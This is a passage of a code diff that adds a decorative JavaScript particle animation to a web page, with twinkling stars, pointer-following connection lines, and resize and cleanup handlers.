+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
